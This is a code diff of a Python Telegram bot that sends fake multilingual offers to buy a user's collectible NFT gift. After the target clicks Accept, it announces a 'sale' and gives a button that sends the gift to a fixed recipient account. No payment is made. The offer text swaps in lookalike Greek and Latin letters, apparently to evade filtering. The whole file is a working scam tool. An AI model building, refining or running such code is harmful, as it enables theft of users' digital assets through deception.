@@ -2,8 +2,6 @@ import asyncio
 import random
 import time
 import logging
-import json
-import os
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.enums import ParseMode
@@ -19,55 +17,41 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 message_queue = asyncio.Queue()
-accept_queue = asyncio.Queue()  # Очередь для принятия офферов с защитой от PEER_FLOOD
+cooldowns = {}
 client_user_ids = {}
-click_cooldowns = {}  # Защита от спама по кнопкам
-
-# Персистентное хранилище для business_connection_id
-BCID_FILE = "bcid_store.json"
-
-def load_bcid_store():
-    if os.path.exists(BCID_FILE):
-        try:
-            with open(BCID_FILE, "r", encoding="utf-8") as f:
-                return json.load(f)
-        except Exception:
-            return {}
-    return {}
-
-def save_bcid_store(store):
-    try:
-        with open(BCID_FILE, "w", encoding="utf-8") as f:
-            json.dump(store, f)
-    except Exception:
-        pass
-
-message_bcid = load_bcid_store()
 
 LOCALES = {
     "ru": {
-        "offer_text": 'Пользователь <b>Molly</b> пρедлагает Вам <b>{amount} {currency_emoji}</b> за коллекционный пρедмет <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>.\n\nПρедложение действует еще 6 ч. 0 мин..',
+        "offer_text": 'Пoльзοватeль <b>cryptan</b> пρeдлагaет Bам <b>{amount} {currency_emoji}</b> зa кoллeкционный пpедмeт <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПpeдлοжeние дeйcтвyeт в тeчeнии 5 ч. 59 мин..',
         "btn_decline": "Отклонить",
-        "btn_accept": "Пρинять",
-        "flood_error": "⚠️ Временное ограничение Telegram (PEER_FLOOD) для этого чата. Попробуйте нажать «Принять» позже."
+        "btn_accept": "Принять",
+        "btn_transfer": "Передать",
+        "btn_confirm": "Подтвердить передачу",
+        "flood_error": "⚠️ Временное ограничение (PEER_FLOOD). Попробуйте отправить запрос позже."
     },
     "eng": {
-        "offer_text": 'User <b>Molly</b> offers you <b>{amount} {currency_emoji}</b> for the collectible item <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>.\n\nOffer is valid for 6 h. 0 min..',
+        "offer_text": 'User <b>cryptan</b> offers you <b>{amount} {currency_emoji}</b> for the collectible item <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nOffer is valid for 5 h. 59 min..',
         "btn_decline": "Decline",
         "btn_accept": "Accept",
-        "flood_error": "⚠️ Temporary Telegram limit (PEER_FLOOD) for this chat. Please try clicking 'Accept' later."
+        "btn_transfer": "Transfer",
+        "btn_confirm": "Confirm transfer",
+        "flood_error": "⚠️ Temporary limit (PEER_FLOOD). Please try sending later."
     },
     "ukr": {
-        "offer_text": 'Коρистувач <b>Molly</b> пропонує Вам <b>{amount} {currency_emoji}</b> за колекційний предмет <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>.\n\nПропозиція діє ще 6 год. 0 хв..',
+        "offer_text": 'Користувач <b>cryptan</b> пропонує Вам <b>{amount} {currency_emoji}</b> за колекційний предмет <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПропозиція діє протягом 5 год. 59 хв..',
         "btn_decline": "Відхилити",
         "btn_accept": "Прийняти",
-        "flood_error": "⚠️ Тимчасове обмеження Telegram (PEER_FLOOD) для цього чату. Спробуйте натиснути «Прийняти» пізніше."
+        "btn_transfer": "Передати",
+        "btn_confirm": "Підтвердити передачу",
+        "flood_error": "⚠️ Тимчасове обмеження (PEER_FLOOD). Спробуйте надіслати пізніше."
     },
     "cn": {
-        "offer_text": '用户 <b>Molly</b> 向您出价 <b>{amount} {currency_emoji}</b> 购买收藏品 <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>。\n\n此出价有效期还有 6 小时 0 分钟。',
+        "offer_text": '用户 <b>cryptan</b> 向您出价 <b>{amount} {currency_emoji}</b> 购买收藏品 <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n此出价有效期为 5 小时 59 分钟。',
         "btn_decline": "拒绝",
         "btn_accept": "接受",
-        "flood_error": "⚠️ 此聊天的 Telegram 暂时限制 (PEER_FLOOD)。请稍后重试。"
+        "btn_transfer": "转移",
+        "btn_confirm": "确认转移",
+        "flood_error": "⚠️ 暂时限制 (PEER_FLOOD)。请稍后重试。"
     }
 }
 
@@ -79,7 +63,7 @@ def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
         emoji_id = "5298988357538328017"
         fallback_char = "💎"
     else:
-        emoji_id = "5920433463428650761"  # ID звезды
+        emoji_id = "5258165702707125574"
         fallback_char = "⭐️"
 
     currency_emoji = f'<tg-emoji emoji-id="{emoji_id}">{fallback_char}</tg-emoji>'
@@ -107,12 +91,14 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
         ]
     )
 
-def make_accept_keyboard():
+def make_accept_keyboard(lang):
+    loc = LOCALES.get(lang, LOCALES["ru"])
     recipient = RECIPIENT.lstrip("@")
+
     return InlineKeyboardMarkup(
         inline_keyboard=[
-            [InlineKeyboardButton(text="Пеρедать НФТ", url=f"tg://send_gift?to={recipient}", icon_custom_emoji_id="5985472565508838112")],
-            [InlineKeyboardButton(text="Подтвеρдить пеρедачу", callback_data="noop", icon_custom_emoji_id="5776375003280838798")],
+            [InlineKeyboardButton(text=loc['btn_transfer'], url=f"tg://send_gift?to={recipient}", icon_custom_emoji_id="5875180111744995604")],
+            [InlineKeyboardButton(text=loc['btn_confirm'], callback_data="noop")],
         ]
     )
 
@@ -145,10 +131,12 @@ async def handle_business_command(message: Message):
     
     if "gram" in text_lower:
         currency_type = "gram"
+        currency_name = "Gram"
     else:
         currency_type = "stars"
+        currency_name = "Stars"
 
-    amount = 500
+    amount = 1000
     for p in parts:
         if p.isdigit():
             amount = int(p)
@@ -179,6 +167,7 @@ async def handle_business_command(message: Message):
         "gift_num": gift_num,
         "amount": amount,
         "currency_type": currency_type,
+        "currency_name": currency_name,
         "lang": lang,
         "bcid": message.business_connection_id,
         "cmd_message_id": message.message_id
@@ -186,13 +175,6 @@ async def handle_business_command(message: Message):
 
 @dp.callback_query(F.data.startswith("a|"))
 async def accept_offer(cb: CallbackQuery):
-    user_id = cb.from_user.id
-    now = time.time()
-    if user_id in click_cooldowns and now - click_cooldowns[user_id] < 1.5:
-        await cb.answer("Слишком часто! Подождите секунду.", show_alert=False)
-        return
-    click_cooldowns[user_id] = now
-
     parts = cb.data.split("|")
     if len(parts) < 6:
         await cb.answer("Ошибка данных", show_alert=True)
@@ -201,39 +183,73 @@ async def accept_offer(cb: CallbackQuery):
     _, slug, gift_num_str, amount, currency_type, lang = parts
     gift_num = int(gift_num_str)
     
+    currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"
+    
+    # ==========================================
+    # И ТУТ ТЫ МОЖЕШЬ ИЗМЕНИТЬ ТЕКСТ НА СООБЩЕНИЕ КОТОРОЕ ХОЧЕШЬ:
+    # ==========================================
+    success_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
+    text = (
+        f"{success_emoji} <b>Предмет #{gift_num} успешно продан!</b>\n\n"
+        f"<b>• Передайте покупателю для зачисления {currency_name}.</b>\n"
+        f"\u200B"
+    )
+    # ==========================================
+    
     chat_id = cb.message.chat.id
     message_id = cb.message.message_id
-    key = f"{chat_id}:{message_id}"
-    bcid = message_bcid.get(key) or cb.message.business_connection_id
+    bcid = cb.message.business_connection_id
 
-    # Сразу убираем часики на кнопке
-    await cb.answer("✅ В очереди...", show_alert=False)
+    await cb.answer("✅ Успешно принято!", show_alert=True)
 
-    # Пушим задачу в очередь принятия
-    await accept_queue.put({
-        "chat_id": chat_id,
-        "message_id": message_id,
-        "slug": slug,
-        "gift_num": gift_num,
-        "amount": amount,
-        "currency_type": currency_type,
-        "lang": lang,
-        "bcid": bcid,
-        "retries": 0
-    })
+    success = False
+
+    # Способ 1: Обычное редактирование
+    try:
+        await bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=make_accept_keyboard(lang),
+            link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
+        )
+        success = True
+    except Exception:
+        pass
+
+    # Способ 2: Редактирование через Business Connection ID
+    if not success and bcid:
+        try:
+            await bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=message_id,
+                text=text,
+                parse_mode=ParseMode.HTML,
+                reply_markup=make_accept_keyboard(lang),
+                business_connection_id=bcid,
+                link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
+            )
+            success = True
+        except Exception as e:
+            if "message is not modified" in str(e):
+                success = True
+
+    if not success:
+        try:
+            await bot.edit_message_reply_markup(
+                chat_id=chat_id,
+                message_id=message_id,
+                reply_markup=None,
+                business_connection_id=bcid
+            )
+        except Exception:
+            pass
 
 @dp.callback_query(F.data.startswith("d|"))
 async def decline_offer(cb: CallbackQuery):
-    chat_id = cb.message.chat.id
-    message_id = cb.message.message_id
-    key = f"{chat_id}:{message_id}"
-    bcid = message_bcid.get(key) or cb.message.business_connection_id
-    
     try:
-        if bcid:
-            await bot.delete_business_messages(business_connection_id=bcid, message_ids=[message_id])
-        else:
-            await bot.delete_message(chat_id=chat_id, message_id=message_id)
+        await bot.delete_business_messages(business_connection_id=cb.message.business_connection_id, message_ids=[cb.message.message_id])
     except Exception:
         pass
     await cb.answer("Предложение отклонено")
@@ -246,7 +262,7 @@ async def sender_worker():
     while True:
         task = await message_queue.get()
         try:
-            await asyncio.sleep(random.uniform(0.8, 1.2))
+            await asyncio.sleep(random.uniform(0.5, 1.0))
 
             text = build_offer_text(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
             keyboard = make_offer_keyboard(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
@@ -260,11 +276,7 @@ async def sender_worker():
                 link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
             )
 
-            if sent_msg and task["bcid"]:
-                key = f"{task['chat_id']}:{sent_msg.message_id}"
-                message_bcid[key] = task["bcid"]
-                save_bcid_store(message_bcid)
-
+            if task["bcid"] and sent_msg:
                 await bot.delete_business_messages(business_connection_id=task["bcid"], message_ids=[task["cmd_message_id"]])
 
         except TelegramRetryAfter as e:
@@ -285,86 +297,13 @@ async def sender_worker():
                     except Exception:
                         pass
             else:
-                logging.error(f"Worker error: {error_str}", exc_info=True)
+                logging.error(f"Worker error: {error_str}")
         finally:
             message_queue.task_done()
 
-async def accept_worker():
-    while True:
-        task = await accept_queue.get()
-        try:
-            await asyncio.sleep(random.uniform(1.0, 1.5))
-
-            slug = task["slug"]
-            gift_num = task["gift_num"]
-            currency_type = task["currency_type"]
-            chat_id = task["chat_id"]
-            message_id = task["message_id"]
-            bcid = task["bcid"]
-
-            currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"
-            gift_name = slug.replace("-", " ")
-            gift_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
-            
-            text = (
-                f"{gift_emoji} Коллекционный пρедмет: <a href=\"https://t.me/nft/{slug}-{gift_num}\"><b>{gift_name}-{gift_num}</b></a> успешно продан!\n\n"
-                f"• Пеρедайте коллекционный предмет покупателю для зачисления {currency_name}."
-            )
-
-            send_kwargs = {
-                "chat_id": chat_id,
-                "text": text,
-                "parse_mode": ParseMode.HTML,
-                "reply_markup": make_accept_keyboard(),
-            }
-            if bcid:
-                send_kwargs["business_connection_id"] = bcid
-
-            await bot.send_message(**send_kwargs)
-
-            if bcid:
-                await bot.delete_business_messages(business_connection_id=bcid, message_ids=[message_id])
-            else:
-                await bot.delete_message(chat_id=chat_id, message_id=message_id)
-
-        except TelegramRetryAfter as e:
-            wait_time = e.retry_after + 2
-            logging.warning(f"Accept flood control! Waiting {wait_time}s.")
-            await asyncio.sleep(wait_time)
-            await accept_queue.put(task)
-            
-        except Exception as e:
-            error_str = str(e)
-            if "PEER_FLOOD" in error_str:
-                retries = task.get("retries", 0) + 1
-                task["retries"] = retries
-                if retries <= 3:
-                    # Увеличиваем задержку экспоненциально: 15с, 30с, 45с, чтобы дать Telegram снять лимит флуда с чата
-                    wait_time = 15 * retries 
-                    logging.warning(f"PEER_FLOOD caught for chat {task['chat_id']}. Retry {retries}/3 in {wait_time}s...")
-                    await asyncio.sleep(wait_time)
-                    await accept_queue.put(task)
-                else:
-                    logging.error(f"PEER_FLOOD limit exceeded for chat {task['chat_id']} after 3 retries. Task dropped.")
-                    target_user_id = client_user_ids.get(task["chat_id"])
-                    loc = LOCALES.get(task["lang"], LOCALES["ru"])
-                    if target_user_id:
-                        try:
-                            await bot.send_message(chat_id=target_user_id, text=loc["flood_error"])
-                        except Exception:
-                            pass
-            else:
-                logging.error(f"Accept worker error: {error_str}", exc_info=True)
-        finally:
-            accept_queue.task_done()
-
 async def main():
     asyncio.create_task(sender_worker())
-    asyncio.create_task(accept_worker())
     await dp.start_polling(bot, allowed_updates=["callback_query", "business_connection", "business_message", "message"])
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except (KeyboardInterrupt, SystemExit):
-        logging.info("Бот остановлен.")
+    asyncio.run(main())
